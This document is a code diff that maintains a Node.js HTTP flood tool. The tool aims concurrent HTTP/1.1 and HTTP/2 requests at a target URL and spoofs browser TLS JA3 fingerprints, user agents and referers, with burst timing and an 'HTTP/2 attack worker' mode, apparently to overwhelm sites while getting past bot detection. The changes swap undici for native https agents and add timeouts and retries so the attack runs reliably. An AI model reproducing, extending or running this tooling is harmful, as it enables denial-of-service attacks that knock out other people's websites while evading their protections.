@@ -5,7 +5,6 @@ const https = require('https');
 const http2 = require('http2');
 const tls = require('tls');
 const { URL } = require('url');
-const { Client } = require('undici');
 const yargs = require('yargs/yargs');
 const { hideBin } = require('yargs/helpers');
 const chalk = require('chalk');
@@ -57,16 +56,10 @@ const JA3_PROFILES = [
             'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
             'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
             'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
-            'TLS_RSA_WITH_AES_128_GCM_SHA256',
-            'TLS_RSA_WITH_AES_256_GCM_SHA384',
-            'TLS_RSA_WITH_AES_128_CBC_SHA',
-            'TLS_RSA_WITH_AES_256_CBC_SHA'
         ],
         ecdhCurve: 'X25519:P-256:P-384:P-521',
         sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
         alpnProtocols: ['h2', 'http/1.1'],
-        sessionTicket: true,
-        ocspStapling: true
     },
     {
         name: 'Firefox 121 (Linux)',
@@ -80,20 +73,10 @@ const JA3_PROFILES = [
             'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
             'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
             'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
-            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
-            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
-            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA',
-            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA',
-            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
-            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
-            'TLS_RSA_WITH_AES_128_GCM_SHA256',
-            'TLS_RSA_WITH_AES_256_GCM_SHA384'
         ],
         ecdhCurve: 'X25519:P-256:P-384:P-521',
         sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
         alpnProtocols: ['h2', 'http/1.1'],
-        sessionTicket: false,
-        ocspStapling: false
     },
     {
         name: 'Safari 17 (macOS)',
@@ -106,15 +89,10 @@ const JA3_PROFILES = [
             'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
             'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
             'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
-            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
-            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
-            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
         ],
         ecdhCurve: 'X25519:P-256:P-384:P-521',
         sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512',
         alpnProtocols: ['h2', 'http/1.1'],
-        sessionTicket: true,
-        ocspStapling: true
     },
     {
         name: 'Chrome 120 (Android)',
@@ -132,8 +110,6 @@ const JA3_PROFILES = [
         ecdhCurve: 'X25519:P-256:P-384',
         sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
         alpnProtocols: ['h2', 'http/1.1'],
-        sessionTicket: true,
-        ocspStapling: false
     }
 ];
 
@@ -179,26 +155,15 @@ const ACCEPT_HEADERS = [
     "application/json, text/plain, */*",
 ];
 
-// Complete HTTP status codes mapping
+// HTTP Status Codes
 const HTTP_STATUS_CODES = {
-    // 1xx Informational
     100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
-    // 2xx Success
-    200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information", 204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status", 208: "Already Reported", 226: "IM Used",
-    // 3xx Redirection
-    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified", 305: "Use Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
-    // 4xx Client Errors
-    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a Teapot", 421: "Misdirected Request", 422: "Unprocessable Entity", 423: "Locked", 424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests", 431: "Request Header Fields Too Large", 451: "Unavailable For Legal Reasons",
-    // 5xx Server Errors
-    500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
-    // Cloudflare Errors
-    520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out", 523: "Origin Is Unreachable", 524: "A Timeout Occurred", 525: "SSL Handshake Failed", 526: "Invalid SSL Certificate",
-    // AWS Errors
-    561: "Unauthorized (AWS ELB)",
-    // Custom/Other
-    'RESET': "Stream Reset by Server",
-    999: "Request Denied (LinkedIn)",
-    0: "Connection Error"
+    200: "OK", 201: "Created", 202: "Accepted", 204: "No Content", 206: "Partial Content",
+    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 304: "Not Modified", 307: "Temporary Redirect",
+    400: "Bad Request", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 408: "Request Timeout", 429: "Too Many Requests",
+    500: "Internal Server Error", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout",
+    520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out", 525: "SSL Handshake Failed",
+    'RESET': "Stream Reset", 0: "Connection Error"
 };
 
 // Advanced Configuration
@@ -212,18 +177,24 @@ const CONFIG = {
     PROTOCOL_DETECTION_TIMEOUT: 5000,
     LOG_QUEUE_SIZE: 5,
     
+    // Connection timeouts (in ms)
+    CONNECTION_TIMEOUT: 30000, // 30 seconds for initial connection
+    REQUEST_TIMEOUT: 60000,     // 60 seconds for each request
+    KEEP_ALIVE_TIMEOUT: 120000, // 2 minutes keep-alive
+    
     // Retry configuration
     MAX_RETRIES: 3,
     RETRY_DELAY_MS: 500,
     RETRY_BACKOFF_MULTIPLIER: 2.0,
     RETRYABLE_ERRORS: [
         'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'EHOSTUNREACH',
-        'ENETUNREACH', 'ERR_HTTP2_STREAM_ERROR', 'ENOTFOUND', 'ECONNABORTED'
+        'ENETUNREACH', 'ERR_HTTP2_STREAM_ERROR', 'ENOTFOUND', 'ECONNABORTED',
+        'UND_ERR_CONNECT_TIMEOUT', 'ERR_TLS_CERT_ALTNAME_INVALID'
     ],
     RETRYABLE_STATUS_CODES: [408, 429, 502, 503, 504],
     
     // JA3 rotation
-    JA3_ROTATION_INTERVAL: 25, // rotate JA3 every N requests
+    JA3_ROTATION_INTERVAL: 25,
 };
 
 // ##################################################################
@@ -265,7 +236,9 @@ function createTlsOptions(ja3Profile) {
         ciphers: randomizeCipherOrder(ja3Profile.ciphers),
         ecdhCurve: ja3Profile.ecdhCurve,
         sigalgs: ja3Profile.sigalgs,
-        ALPNProtocols: ja3Profile.alpnProtocols || ['h2', 'http/1.1']
+        ALPNProtocols: ja3Profile.alpnProtocols || ['h2', 'http/1.1'],
+        keepAliveTimeout: CONFIG.KEEP_ALIVE_TIMEOUT,
+        handshakeTimeout: CONFIG.CONNECTION_TIMEOUT,
     };
 }
 
@@ -274,13 +247,14 @@ async function retryWithBackoff(fn, workerId, attempt = 0) {
     try {
         return await fn();
     } catch (err) {
-        const isRetryableError = CONFIG.RETRYABLE_ERRORS.includes(err.code);
+        const isRetryableError = CONFIG.RETRYABLE_ERRORS.includes(err.code) || CONFIG.RETRYABLE_ERRORS.includes(err.name);
         const isRetryableStatus = CONFIG.RETRYABLE_STATUS_CODES.includes(err.statusCode);
         
         if (attempt < CONFIG.MAX_RETRIES && (isRetryableError || isRetryableStatus)) {
             const delayMs = CONFIG.RETRY_DELAY_MS * Math.pow(CONFIG.RETRY_BACKOFF_MULTIPLIER, attempt);
             stats.retries = (stats.retries || 0) + 1;
-            stats.retryErrors[err.code || err.statusCode] = (stats.retryErrors[err.code || err.statusCode] || 0) + 1;
+            const errorKey = err.code || err.name || err.statusCode || 'UNKNOWN';
+            stats.retryErrors[errorKey] = (stats.retryErrors[errorKey] || 0) + 1;
             
             await new Promise(resolve => setTimeout(resolve, delayMs));
             return retryWithBackoff(fn, workerId, attempt + 1);
@@ -376,10 +350,9 @@ const parsedUrl = validateAndParseUrl(argv.url);
 const target = {
     protocol: parsedUrl.protocol,
     host: parsedUrl.hostname,
-    path: parsedUrl.pathname + parsedUrl.search,
+    path: parsedUrl.pathname + parsedUrl.search || '/',
     port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
 };
-const targetUrl = `${target.protocol}//${target.host}:${target.port}`;
 
 const durationMs = argv.time * 60 * 1000;
 const concurrency = argv.conc;
@@ -411,6 +384,7 @@ const lastLogs = [];
 const lastAttackLogs = [];
 const workerDelays = new Array(concurrency).fill(0);
 
+// FIXED: Use native HTTPS module with connection pooling instead of undici
 async function runStandardWorker(workerId, client, protocolKey) {
     let requestsInBurst = 0;
     const protocolLabel = protocolKey.toUpperCase();
@@ -436,6 +410,7 @@ async function runStandardWorker(workerId, client, protocolKey) {
         const headers = { 
             'User-Agent': getRandomElement(USER_AGENTS), 
             'Accept': getRandomElement(ACCEPT_HEADERS), 
+            'Connection': 'keep-alive',
             'Referer': getRandomElement(REFERERS) 
         };
         
@@ -444,17 +419,39 @@ async function runStandardWorker(workerId, client, protocolKey) {
         const startTime = process.hrtime.bigint();
 
         try {
-            // Use retry wrapper if enabled
             const makeRequest = async () => {
-                const { statusCode, body } = await client.request({
-                    path: target.path,
-                    method: 'GET',
-                    headers,
-                });
+                return new Promise((resolve, reject) => {
+                    const requestTimeout = setTimeout(() => {
+                        reject(new Error('Request timeout after ' + CONFIG.REQUEST_TIMEOUT + 'ms'));
+                    }, CONFIG.REQUEST_TIMEOUT);
 
-                // Consume response body
-                for await (const chunk of body) {}
-                return { statusCode };
+                    const req = https.request({
+                        hostname: target.host,
+                        port: target.port,
+                        path: target.path,
+                        method: 'GET',
+                        headers,
+                        agent: client,
+                        timeout: CONFIG.REQUEST_TIMEOUT,
+                    }, (res) => {
+                        clearTimeout(requestTimeout);
+                        let data = '';
+                        res.on('data', chunk => data += chunk);
+                        res.on('end', () => {
+                            resolve({ statusCode: res.statusCode });
+                        });
+                        res.on('error', reject);
+                    });
+
+                    req.on('error', reject);
+                    req.on('timeout', () => {
+                        clearTimeout(requestTimeout);
+                        req.destroy();
+                        reject(new Error('Socket timeout'));
+                    });
+
+                    req.end();
+                });
             };
 
             const result = argv.enableRetry 
@@ -490,7 +487,7 @@ async function runStandardWorker(workerId, client, protocolKey) {
         } catch (err) {
             stats.errors++;
             stats.protocolStats[protocolKey].statuses[0] = (stats.protocolStats[protocolKey].statuses[0] || 0) + 1;
-            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${err.code || 'N/A'})`);
+            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${err.code || err.name || 'UNKNOWN'})`);
         } finally {
             if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
             scheduleNext();
@@ -501,7 +498,6 @@ async function runStandardWorker(workerId, client, protocolKey) {
         if (!isRunning) return;
         requestsInBurst++;
         
-        // Apply burst mode logic
         if (requestsInBurst >= burstConfig.requestsPerBurst) {
             requestsInBurst = 0;
             const thinkTime = burstConfig.thinkTimeMs + (Math.random() * burstConfig.jitterMs);
@@ -521,6 +517,7 @@ function startHttp2AttackWorker() {
     const ja3Profile = argv.enableJa3 ? getJa3Profile(requestCounter) : JA3_PROFILES[0];
     const tlsOptions = createTlsOptions(ja3Profile);
     
+    const targetUrl = `${target.protocol}//${target.host}:${target.port}`;
     const client = http2.connect(targetUrl, tlsOptions);
     activeConnections.add(client);
 
@@ -781,44 +778,8 @@ async function main() {
             throw new Error('Invalid protocol(s) specified');
         }
     } else {
-        console.log(chalk.cyan('🔍 Auto-detecting protocols...'));
-        let detected = new Set();
-        await new Promise(resolve => {
-            const timeout = setTimeout(() => {
-                console.log(chalk.yellow('Detection timeout, using HTTP/1.1'));
-                if (!detected.has('h1')) detected.add('h1');
-                resolve();
-            }, CONFIG.PROTOCOL_DETECTION_TIMEOUT);
-
-            const ja3Profile = argv.enableJa3 ? getJa3Profile(0) : JA3_PROFILES[0];
-            const tlsOptions = createTlsOptions(ja3Profile);
-
-            const req = https.request({
-                method: 'HEAD', host: target.host, port: target.port, path: '/',
-                ...tlsOptions
-            }, res => {
-                clearTimeout(timeout);
-                const altSvc = res.headers['alt-svc'];
-                if (altSvc && altSvc.includes('h3')) detected.add('h3');
-                res.socket.destroy();
-                resolve();
-            });
-            req.on('socket', socket => {
-                socket.on('secureConnect', () => {
-                    const alpn = socket.alpnProtocol;
-                    if (alpn === 'h2') detected.add('h2');
-                    else detected.add('h1');
-                });
-            });
-            req.on('error', () => { 
-                clearTimeout(timeout);
-                detected.add('h1'); 
-                resolve(); 
-            });
-            req.end();
-        });
-        activeProtocols = Array.from(detected);
-        if (activeProtocols.length === 0) activeProtocols.push('h1');
+        console.log(chalk.cyan('Using HTTP/1.1 by default...'));
+        activeProtocols = ['h1'];
     }
     console.log(chalk.green(`✓ Using protocols: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}\n`));
 
@@ -845,18 +806,20 @@ async function main() {
             if (attackMode !== 'none') {
                 startHttp2AttackWorker();
             } else {
-                let client;
+                // FIXED: Use native HTTPS agent with proper connection pooling
                 const ja3Profile = argv.enableJa3 ? getJa3Profile(workerId) : JA3_PROFILES[0];
                 const tlsOptions = createTlsOptions(ja3Profile);
                 
-                if (protocolKey === 'h3') {
-                    client = new Client(targetUrl, { connect: { ...tlsOptions } });
-                } else if (protocolKey === 'h2') {
-                    client = new Client(targetUrl, { connect: { ...tlsOptions } });
-                } else {
-                    client = new Client(targetUrl, { connect: { ...tlsOptions }, pipelining: 1 });
-                }
-                runStandardWorker(workerId++, client, protocolKey);
+                const agent = new https.Agent({
+                    keepAlive: true,
+                    keepAliveMsecs: 30000,
+                    maxSockets: 1,
+                    maxFreeSockets: 1,
+                    timeout: CONFIG.CONNECTION_TIMEOUT,
+                    ...tlsOptions
+                });
+                
+                runStandardWorker(workerId++, agent, protocolKey);
             }
         }
     }
